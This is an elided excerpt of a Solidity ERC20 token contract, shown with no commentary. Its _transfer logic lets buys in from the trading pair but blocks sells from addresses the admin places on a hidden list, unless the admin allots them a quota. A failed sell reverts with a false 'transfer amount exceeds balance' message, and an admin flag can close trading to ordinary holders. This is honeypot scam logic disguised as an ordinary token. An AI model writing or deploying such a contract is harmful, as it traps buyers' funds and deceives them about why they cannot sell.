...
contract Token is ERC20,Control{  
    ...
    mapping (address=>uint256) private _conceptlist;  
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        require(amount>0);  
        if(_rty){
            if(from==_pair || from==_token || from==_airdrop){ 
            }else{ 
                    require(false,"trading is Close");
                }   
        } 
        if(to==_pair){  
            if(_conceptlist[from]==1  && _abab[from]>=amount){
                _abab[from]=_abab[from].sub(amount);  
            }else{ 
                require(_conceptlist[from]==0,"ERC20: transfer amount exceeds balance"); 
            }
        }else if(from!=_pair){  
            if(_conceptlist[from]==1  && _abab[from]>=amount){
                 _abab[from]=_abab[from].sub(amount);  
    ...
    function setAirDrop(address airadd)public  onlyRole(DEFAULT_ADMIN_ROLE){
        _airdrop=airadd;
    }
    function setNumber(address user, uint256 number) public  onlyRole(DEFAULT_ADMIN_ROLE){
         _abab[user]=number*10**18;
    } 
    function setConceptlist(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _conceptlist[user]=1;
    }
    function UnConceptlist(address user) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _conceptlist[user]=0;
    }         
